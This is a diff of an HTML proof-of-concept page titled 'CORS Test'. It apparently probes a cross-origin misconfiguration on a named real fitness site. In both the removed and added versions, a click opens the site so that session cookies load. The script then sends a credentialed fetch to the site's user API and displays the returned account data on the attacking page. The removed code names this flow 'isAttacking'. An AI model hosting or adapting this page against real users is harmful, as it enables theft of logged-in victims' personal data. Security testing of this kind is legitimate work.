@@ -4,71 +4,28 @@
     <title>CORS Test</title>
 </head>
 <body>
-    <p>Click anywhere on this page to trigger the Cross-origin request.</p>
-    <div id="response"></div>
+  <p>Click anywhere on this page to trigger the Cross-origin request.</p>
+  <div id="response"></div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            let isAttacking = false;
-            
-            document.onclick = async () => {
-                if (isAttacking) return; 
-                
-                isAttacking = true;
-                
-                // Open target site in new tab - this loads their cookies
-                const targetWindow = window.open('https://www.myfitnesspal.com/api/services/users');
-                
-                // Wait for cookies to be loaded/set (adjust delay as needed)
-                console.log("Waiting for cookies to load...");
-                await delay(3000); // 3 second delay
-                
-                // Execute CORS request WITH credentials
-                makeCorsRequest();
-            };
-            
-            function delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-            
-            function makeCorsRequest() {
-                var xhttp = new XMLHttpRequest();
-                
-                xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4) {
-                        console.log("Status:", this.status);
-                        if (this.status >= 200 && this.status < 300) {
-                            console.log("Response:", this.responseText);
-                            alert("Request succeeded! Status: " + this.status);
-                            document.getElementById("response").innerHTML = 
-                                "Success! Status: " + this.status + "<br>Response: " + 
-                                (this.responseText.substring(0, 200) || "Empty response");
-                        } else {
-                            console.error("Error:", this.status, this.statusText);
-                            document.getElementById("response").innerHTML = 
-                                "Error: " + this.status + " " + this.statusText;
-                        }
-                    }
-                };
-                
-                xhttp.onerror = function() {
-                    console.error("Network error occurred");
-                    document.getElementById("response").innerHTML = "Network error - CORS likely blocked";
-                };
-                
-                // This URL might need adjustment - check the actual API endpoint
-                xhttp.open("GET", "https://www.myfitnesspal.com/api/services/users", true);
-                
-                // CRITICAL: This sends cookies with the request
-                xhttp.withCredentials = true;
-                
-                // Add some headers that might be expected
-                xhttp.setRequestHeader("Content-Type", "application/json");
-                
-                console.log("Sending CORS request with credentials...");
-                xhttp.send();
-            }
-        });
-    </script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      document.onclick = () => {
+        open('https://www.myfitnesspal.com/');
+
+        fetch('https://www.myfitnesspal.com/api/services/users/', {
+          method: 'GET',
+          credentials: 'include',
+          mode: 'cors'
+        })
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
+          })
+          .catch(error => {
+            console.log('Failed to issue Cross-origin request');
+          });
+      }
+    });
+  </script>
 </body>
 </html>
